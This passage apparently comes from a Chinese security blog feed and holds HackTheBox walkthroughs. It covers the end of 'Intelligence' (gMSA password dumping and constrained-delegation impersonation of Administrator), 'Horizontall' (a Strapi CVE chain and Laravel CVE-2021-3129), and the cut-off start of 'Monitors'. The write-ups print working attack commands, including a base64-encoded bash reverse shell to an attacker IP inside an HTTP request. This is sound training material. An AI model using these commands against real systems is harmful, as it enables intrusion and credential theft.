-m <span class="hljs-number">5600</span> -a <span class="hljs-number">0</span> hash <span class="hljs-string">&quot;E:\path\pass_en.txt&quot;</span> # 这里的字典就是rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005162018451.png" alt="image-20211005162018451"></p><p>但是登上去后，并没有任何更多的信息，所以不是smb这条路，我们需要换一条思路：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005162902520.png" alt="image-20211005162902520"></p><p>回去翻翻pdf，在最后一条能够发现一些提示信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005165904813.png" alt="image-20211005165904813"></p><p>也就是说，此时此刻服务账户是未被锁定的。</p><p>看看ldap信息，使用ldapdomaindump导出所有ldap信息：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ldapdomaindump</span>  -u <span class="hljs-string">&quot;intelligence.htb\TED.GRAVES&quot;</span> -p <span class="hljs-string">&quot;Mr.Teddy&quot;</span> intelligence.htb<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008110726034.png" alt="image-20211008110726034"></p><p>一个个看过去，首先在domain_computers中就能发现一个不同寻常的账户svc_int，它还配置了约束委派的标志位：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008110856112.png" alt="image-20211008110856112"></p><p>对该机器账户进行更详细的信息收集，使用powersploit的powerview模块，<a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainComputer/">参考</a>：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; <span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Mr.Teddy&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>  <br><span class="hljs-built_in">PS</span> &gt; <span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;intelligence.htb\TED.GRAVES&#x27;</span>, <span class="hljs-variable">$SecPassword</span>)<br><span class="hljs-built_in">PS</span> &gt; <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Domain</span> intelligence.htb <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Server</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.248</span> svc_int<br></code></pre></td></tr></table></figure><p>得到信息如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwdlastset</span>                     : <span class="hljs-number">2021</span>/<span class="hljs-number">10</span>/<span class="hljs-number">7</span> <span class="hljs-number">21</span>:<span class="hljs-number">28</span>:<span class="hljs-number">38</span><br><span class="hljs-attribute">logoncount</span>                     : <span class="hljs-number">0</span><br><span class="hljs-attribute">badpasswordtime</span>                : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">msds</span>-managedpasswordpreviousid : &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>...&#125;<br><span class="hljs-attribute">distinguishedname</span>              : CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb<br><span class="hljs-attribute">objectclass</span>                    : &#123;top, person, organizationalPerson, user...&#125;<br><span class="hljs-attribute">name</span>                           : svc_int<br><span class="hljs-attribute">objectsid</span>                      : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">4210132550</span>-<span class="hljs-number">3389855604</span>-<span class="hljs-number">3437519686</span>-<span class="hljs-number">1144</span><br><span class="hljs-attribute">msds</span>-groupmsamembership        : &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">128</span>...&#125;<br><span class="hljs-attribute">localpolicyflags</span>               : <span class="hljs-number">0</span><br><span class="hljs-attribute">codepage</span>                       : <span class="hljs-number">0</span><br><span class="hljs-attribute">samaccounttype</span>                 : MACHINE_ACCOUNT<br><span class="hljs-attribute">accountexpires</span>                 : NEVER<br><span class="hljs-attribute">countrycode</span>                    : <span class="hljs-number">0</span><br><span class="hljs-attribute">whenchanged</span>                    : <span class="hljs-number">2021</span>/<span class="hljs-number">10</span>/<span class="hljs-number">7</span> <span class="hljs-number">13</span>:<span class="hljs-number">28</span>:<span class="hljs-number">38</span><br><span class="hljs-attribute">instancetype</span>                   : <span class="hljs-number">4</span><br><span class="hljs-attribute">usncreated</span>                     : <span class="hljs-number">12846</span><br><span class="hljs-attribute">objectguid</span>                     : f180a079-f326-<span class="hljs-number">49</span>b2-<span class="hljs-number">84</span>a1-<span class="hljs-number">34824208</span>d642<br><span class="hljs-attribute">msds</span>-managedpasswordid         : &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>...&#125;<br><span class="hljs-attribute">msds</span>-allowedtodelegateto       : WWW/dc.intelligence.htb<br><span class="hljs-attribute">samaccountname</span>                 : svc_int$<br><span class="hljs-attribute">objectcategory</span>                 : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=h<br>                                 <span class="hljs-attribute">tb</span><br><span class="hljs-attribute">dscorepropagationdata</span>          : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">msds</span>-managedpasswordinterval   : <span class="hljs-number">30</span><br><span class="hljs-attribute">lastlogon</span>                      : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">badpwdcount</span>                    : <span class="hljs-number">0</span><br><span class="hljs-attribute">cn</span>                             : svc_int<br><span class="hljs-attribute">useraccountcontrol</span>             : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION<br><span class="hljs-attribute">whencreated</span>                    : <span class="hljs-number">2021</span>/<span class="hljs-number">4</span>/<span class="hljs-number">19</span> <span class="hljs-number">0</span>:<span class="hljs-number">49</span>:<span class="hljs-number">58</span><br><span class="hljs-attribute">primarygroupid</span>                 : <span class="hljs-number">515</span><br><span class="hljs-attribute">iscriticalsystemobject</span>         : False<br><span class="hljs-attribute">msds</span>-supportedencryptiontypes  : <span class="hljs-number">28</span><br><span class="hljs-attribute">usnchanged</span>                     : <span class="hljs-number">102507</span><br><span class="hljs-attribute">lastlogoff</span>                     : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">dnshostname</span>                    : svc_int.intelligence.htb<br></code></pre></td></tr></table></figure><p>从objectcategory中我们可以看出，该账户是一个GMSA（<a href="https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview">Group Managed Service Accounts</a>）账户，详见官方文档：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008111335821.png" alt="image-20211008111335821"></p><p>在<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password">PayloadsAllTheThings</a>中，我们能发现对GMSA账户的利用方法：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008111737837.png" alt="image-20211008111737837"></p><p>尝试进行利用，很幸运地读到了该账户的密码（因为我们的Ted用户是itsupport组的成员之一）：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">╭─root<span class="hljs-variable">@kali</span> ~<span class="hljs-regexp">/Tools/g</span>MSADumper ‹main› <br>╰─<span class="hljs-comment"># python3 gMSADumper.py -u TED.GRAVES -p Mr.Teddy -d intelligence.htb</span><br><br>Users <span class="hljs-keyword">or</span> groups who can read password <span class="hljs-keyword">for</span> svc_int<span class="hljs-variable">$:</span><br> &gt; <span class="hljs-variable constant_">DC</span><span class="hljs-variable">$</span><br><span class="hljs-variable"></span> &gt; itsupport<br>svc_int<span class="hljs-variable">$:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:d170ae19de30439df55d6430e12dd621</span><br></code></pre></td></tr></table></figure><p>之后便可以进行约束委派攻击了，但首先我们需要校准时间，否则Kerberos会报错：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">╭─<span class="hljs-symbol">root@</span>kali ~/Tools/gMSADumper ‹main› <br>╰─# getST.py <span class="hljs-built_in">int</span>elligence.htb/svc_int$ -spn WWW/dc.<span class="hljs-built_in">int</span>elligence.htb -hashes :d170ae19de30439df55d6430e12dd621 -impersonate Administrator<br>Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.23</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><span class="hljs-string"></span><br><span class="hljs-string">[*]</span> Getting TGT <span class="hljs-keyword">for</span> user<br>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br></code></pre></td></tr></table></figure><p>使用ntpdate进行校正：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">╭─root@kali ~/下载 <br>╰─<span class="hljs-comment"># ntpdate dc.intelligence.htb </span><br> <span class="hljs-number">8</span> Oct <span class="hljs-number">05</span>:<span class="hljs-number">36</span>:<span class="hljs-number">13</span> ntpdate[<span class="hljs-number">43971</span>]: step <span class="hljs-built_in">time</span> server <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> <span class="hljs-built_in">offset</span> +<span class="hljs-number">25196.736528</span> <span class="hljs-built_in">sec</span><br></code></pre></td></tr></table></figure><p>然后再拿Service Ticket：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">╭─<span class="hljs-symbol">root@</span>kali ~/下载 <br>╰─# getST.py <span class="hljs-built_in">int</span>elligence.htb/svc_int$ -spn WWW/dc.<span class="hljs-built_in">int</span>elligence.htb -hashes :d170ae19de30439df55d6430e12dd621 -impersonate Administrator<br>Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.23</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><span class="hljs-string"></span><br><span class="hljs-string">[*]</span> Getting TGT <span class="hljs-keyword">for</span> user<br><span class="hljs-string">[*]</span> Impersonating Administrator<br><span class="hljs-string">[*]</span> Requesting S4U2self<br><span class="hljs-string">[*]</span> Requesting S4U2Proxy<br><span class="hljs-string">[*]</span> Saving ticket <span class="hljs-keyword">in</span> Administrator.ccache<br></code></pre></td></tr></table></figure><blockquote><p>此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，<strong>还可以访问使用与模拟帐户权限允许的任何服务</strong>。（因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执 行 DCSync。</p></blockquote><p>export后使用impacket中的smbclient模块登录拿flag即可：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator.ccache<br>impacket-smbclient intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008095012419.png" alt="image-20211008095012419"></p><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Medium难度的Windows靶机，主要考察内容如下：</p><ul><li>从pdf内容中收集信息</li><li>密码喷洒攻击</li><li>smb共享目录利用</li><li>BloodHound使用</li><li>约束委派攻击</li><li>GMSA攻击</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Horizontall</title>
    <link href="/2021/12/07/HTB/Horizontall/"/>
    <url>/2021/12/07/HTB/Horizontall/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h1><p>该靶机设置了域名，需要手动在host文件配置ip地址。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210905215302816.png" alt="image-20210905215302816"></p><p>配置完成后即可访问靶机。看到vue的图标也就不难看出这是一个前后端分离的网站，我们的目标应该主要放在后端的接口上。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210905220136069.png" alt="image-20210905220136069"></p><h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><p>我安装的burp插件帮我找到了一个子域名，同样我们需要将其录入hosts文件中绑定靶机的ip，这样才能正常访问：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210905220111940.png" alt="image-20210905220111940"></p><p>如下即可：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210905220548469.png" alt="image-20210905220548469"></p><p>访问得到结果，但是不是我们想要的东西，我们可以通过目录扫描的方式查找接口：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210905220416284.png" alt="image-20210905220416284"></p><p>对主域名<code>horizontall.htb</code>的目录扫描没有发现有用的情况，但是对<code>api-prod.horizontall.htb</code>的扫描能够找到后台管理界面：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210905222424220.png" alt="image-20210905222424220"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210905222400016.png" alt="image-20210905222400016"></p><p>访问后台界面：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210905222622577.png" alt="image-20210905222622577"></p><p>尝试爆破无果，将目标转移到CVE上。一番搜索后锁定了两个CVE：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907165146862.png" alt="image-20210907165146862"></p><p>嗯，也就是我们需要打一个组合拳。</p><p>首先是利用未授权更改密码的CVE添加管理员密码，并获取token。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210906105916891.png" alt="image-20210906105916891"></p><p>添加账号后我们能够进入后台，但是后台找了一圈没有有用的功能点，需要继续利用第二个漏洞进行RCE。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210906110103051.png" alt="image-20210906110103051"></p><p>将第二个CVE的有效payload提取出来，并替换自己的命令。如下：</p><p>这里需要注意的是不能直接使用明文的反弹shell命令，如<code>bash -i &gt; /dev/tcp/192.168.25.144/8888 0&gt;&amp;1</code>，后面测试发现应该是重定向符<code>&amp;</code>会干扰。应该是被识别成了传参的分隔符吧。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin/plugins/install</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>api-prod.horizontall.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwOTA0NTk0LCJleHAiOjE2MzM0OTY1OTR9.eJILaL-n15d9EYeDtbA_tU5509SQllz2XKKMG2xqH1M<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>112<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-reasonml">plugin=documentation%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>+<span class="hljs-constructor">$(<span class="hljs-params">echo</span>+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNjgvMjMzMyAwPiYx+|+<span class="hljs-params">base64</span>+-<span class="hljs-params">d</span>+|+<span class="hljs-params">bash</span>)</span></span><br></code></pre></td></tr></table></figure><p>payload解码后如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">YmFzaCAtaSA%<span class="hljs-number">2</span>bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNjgvMjMzMyAwPiYx<br><br>                      ↓<br><br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.14.168/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>使用nc命令开启即可拿到反弹的shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907170112289.png" alt="image-20210907170112289"></p><p>这里可以使用python的命令获得一个更好使的pty：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>这样我们可以拿到user的flag了，如果想拿root的flag需要进一步提权。</p><h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><p>使用linpeas扫了一圈没啥收获。然后这里之后我就卡住了。</p><p>两天后回来继续看，去论坛和别的老哥交流了一下，给的提示是关注可疑的开放端口。</p><p>然后又回linpeas看了看端口，发现确实有可疑的端口：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907171216367.png" alt="image-20210907171216367"></p><p>这里探测了一下，1337端口是后端的<code>api-prod.horizontall.htb</code>处理的端口，应该是做了反向代理。</p><p>继续，那就是需要架设隧道来进行访问了。使用ssh尝试远端转发未果，上frp。frp配置如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907171709316.png" alt="image-20210907171709316"></p><p>使用wget下载，然后运行：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907144742849.png" alt="image-20210907144742849"></p><p>访问本机8000端口查看，发现是laravel框架：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907144819282.png" alt="image-20210907144819282"></p><p>转了一圈依旧没有发现有用信息，遂考虑CVE。网上搜了一圈找到了今年爆出的一个RCE漏洞：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907171945230.png" alt="image-20210907171945230"></p><p>该漏洞检测的poc如下，如果返回值为500则大概率说明漏洞存在：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139.xxxxxx:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>168<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;xxxxxxx&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br><span class="language-swift"></span><br></code></pre></td></tr></table></figure><p>执行结果如下，可以判断该框架很可能存在漏洞：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907153411039.png" alt="image-20210907153411039"></p><p>这里为了省时间直击上网找了exp，地址为 <a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a> 。</p><p>这里需要注意的是，该exp不能使用127.0.0.1作为地址（至少在我测试的过程中是这样的），原因不明。</p><p>运行exp，可以得到结果，可以看到是root。这样我们如果拿到shell的话就是root权限了：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907154709059.png" alt="image-20210907154709059"></p><p>验证漏洞存在后可以修改payload，让它弹一个shell回来。这里为了排除干扰也是选择了把payload放在攻击机上。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907172742029.png" alt="image-20210907172742029"></p><p>test.txt 的文件内容如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907163250421.png" alt="image-20210907163250421"></p><p>运行exp，成功拿到root的shell。查看flag即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Horizontall.assets/image-20210907163455505.png" alt="image-20210907163455505"></p><h1 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h1><p>emm。。值得一提的是这个box的评级居然只是easy。论坛上也有很多老哥吐槽说应该设成medium。</p><p>复盘一下思路吧，这个靶机还是很有意思的：</p><ol><li>利用了两个CVE组合拳打下user权限的shell</li><li>利用开设在本机的服务提权，再次利用CVE拿下root的shell</li></ol><p>总结起来就是这两句话，但这条路要是自己摸索出来的话还是会踩很多坑的。总之也是又学了一些东西，还不错</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Monitors</title>
    <link href="/2021/12/07/HTB/Monitors/"/>
    <url>/2021/12/07/HTB/Monitors/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-端口探测"><a href="#0x01-端口探测" class="headerlink" title="0x01 端口探测"></a>0x01 端口探测</h1><p>使用<code>nmap</code>对靶机端口进行探测：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -v <span class="hljs-number">10.10.10.238</span><br></code></pre></td></tr></table></figure><p>发现只有两个端口是开着的：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">PORT</span>   <span class="hljs-title class_">STATE</span> <span class="hljs-title class_">SERVICE</span> <span class="hljs-title class_">VERSION</span><br><span class="hljs-number">22</span>/tcp open  ssh     <span class="hljs-title class_">OpenSSH</span> <span class="hljs-number">7.6</span>p1 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">3</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span> <br>|   <span class="hljs-number">2048</span> <span class="hljs-symbol">ba:</span><span class="hljs-symbol">cc:</span><span class="hljs-symbol">cd:</span><span class="hljs-number">81</span><span class="hljs-symbol">:fc</span><span class="hljs-symbol">:</span><span class="hljs-number">91</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:f6</span><span class="hljs-symbol">:a9</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">f:</span><span class="hljs-number">4</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">e8:</span><span class="hljs-symbol">be:</span><span class="hljs-symbol">e5:</span><span class="hljs-number">2</span>e (<span class="hljs-title class_">RSA</span>)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">69</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span><span class="hljs-symbol">:</span><span class="hljs-number">37</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">a:</span><span class="hljs-number">18</span><span class="hljs-symbol">:</span><span class="hljs-number">09</span><span class="hljs-symbol">:f5</span><span class="hljs-symbol">:e7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">a:</span><span class="hljs-number">67</span><span class="hljs-symbol">:b8</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:ea</span><span class="hljs-symbol">:d7</span><span class="hljs-symbol">:</span><span class="hljs-number">65</span> (<span class="hljs-title class_">ECDSA</span>)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">5</span><span class="hljs-symbol">d:</span><span class="hljs-number">5</span><span class="hljs-symbol">e:</span><span class="hljs-number">3</span><span class="hljs-symbol">f:</span><span class="hljs-number">67</span><span class="hljs-symbol">:ef</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span 